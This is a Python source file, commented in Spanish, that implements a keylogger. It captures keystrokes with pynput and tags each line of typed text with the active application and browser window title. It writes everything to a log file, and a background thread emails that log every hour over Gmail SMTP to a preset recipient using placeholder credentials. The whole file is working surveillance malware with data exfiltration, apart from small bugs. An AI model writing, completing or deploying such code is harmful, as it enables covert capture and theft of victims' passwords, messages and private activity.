from pynput.keyboard import Key, Listener
from datetime import datetime
import psutil
import platform
import pygetwindow as gw
import win32gui
import win32process
import smtplib
import time
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading

# Datos del correo
correo_origen = "ficticio@gmail.com"
contraseña = "contraseña_ficticia"
correo_destino = "destinatario@example.com"
log_filename = "log.txt"



current_text = [] 


# Configuración para correo con SMTP

def enviar_correo():
    try:
        msg = MIMEMultipart()
        msg['From'] = correo_origen
        msg['To'] = correo_destino
        msg['Subject'] = f"Log enviado el {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        cuerpo = 'Este es el log generado de forma automática'
        msg.attach(MIMEText(cuerpo, 'plain'))

        with open(log_filename, 'tb') as archivo_log:
            parte = MIMEBase('aplication', 'octet-stream')
            parte.set_payload(archivo_log.read())
            encoders.encode_base64(parte)
            parte.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(log_filename)}")
            msg.attach(parte)

            # Conectar con el servidor SMTP

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(correo_origen, contraseña)

            # Enviar Correo 

            texto = msg.as_string()
            server.sendmail(correo_origen, correo_destino, texto)
            server.quit()


            print(f"Correo enviado exitosamente a {correo_destino} con el log adjunto.")
    except Exception as e:
            print(f"Error al enviar el correo: {e}")


# Enviar el correo cada X horas

def enviar_cada(intervalo_horas):
    while True:
        enviar_correo()
        print(f"Esperando {intervalo_horas} horas para el siguiente envío...")
        time.sleep(intervalo_horas * 3600) # Convierte las horas a segundos

# Iniciar la función en un hilo que no bloquee el pprograma 

def iniciar_envio_cada(intervalo_horas):
    hilo_envio = threading.Thread(target=enviar_cada, args=(intervalo_horas,))
    hilo_envio.daemon = True # Para que el ilo termine al cerrar el programa
    hilo_envio.start()
    
# Inicia el envio cada x horas

iniciar_envio_cada(1)



# Función para obtener la aplicación activa

def aplicacion_activa():
    if platform.system() == 'Windows':

        window = win32gui.GetForegroundWindow()
        pid = win32process.GetWindowThreadProcessId(window)[-1]
        proceso = psutil.Process(pid)
        nombre_aplicacion = proceso.name()
        titulo_ventana = win32gui.GetWindowText(window)
        return nombre_aplicacion, titulo_ventana
    elif platform.system() == 'Linux':
        pass
    elif platform.system() == 'Darwin':
        pass
    return None, None

# Función para navegador

def detectar_navegador(nombre_aplicacion, titulo_ventana):
    navegadores = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'opera.exe', 'opera_gx.exe', 'brave.exe']
    if nombre_aplicacion.lower() in navegadores:
        ventanas = gw.getWindowsWithTitle(titulo_ventana)
        if ventanas:
            return ventanas[0].title  #Titulo de la ventana del navegador como retorno
        return None



# Función de fecha y hora
def iniciar_log():
    with open(log_filename, 'a', encoding='utf-8') as logfile:
        logfile.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}:\n")



def presionar_tecla(key):
    global current_text

    if key == Key.space:
        current_text.append(" ")
    elif key == Key.enter:
        guardar_texto_con_fecha()  # Guardar el texto acumulado con la aplicación y el navegador
    elif key == Key.backspace:
        if current_text:
            current_text.pop()  # Borrar el último carácter
    elif key == Key.esc:
        guardar_texto_con_fecha()  # Guardar lo que hay antes de salir
        return False  # Detener el listener
    else:
        try:
            current_text.append(key.char)  # Agregar el carácter al texto
        except AttributeError:
            pass

# Guardar el texto con la fecha y hora al presionar Enter
def guardar_texto_con_fecha():
    if current_text:  

        nombre_aplicacion, titulo_ventana = aplicacion_activa()
        ventana_navegador = detectar_navegador(nombre_aplicacion, titulo_ventana)

        with open(log_filename, 'a', encoding='utf-8') as logfile:
            logfile.write("".join(current_text))
            logfile.write("".join("\n"))
            logfile.write(f"App: {nombre_aplicacion}\n")
            if ventana_navegador:
                logfile.write(f"Navegador: {titulo_ventana}\n")

        current_text.clear()  
    with open(log_filename, 'a', encoding='utf-8') as logfile:

        logfile.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}:\n")

# Actualizar el archivo en tiempo real solo cuando se presiona una tecla
def actualizar_log(borrado=False):
    with open(log_filename, 'r+', encoding='utf-8') as logfile:
        logfile.seek(0, 2)  # Mover al final
        if borrado:
            if logfile.tell() > 0:
                logfile.seek(logfile.tell() - 1) 
                logfile.truncate()  # Eliminar el último carácter
        else:
            if current_text: 
                logfile.write(current_text[-1])  

# Iniciar el listener
iniciar_log() 
with Listener(on_press=presionar_tecla) as listener:
    listener.join()

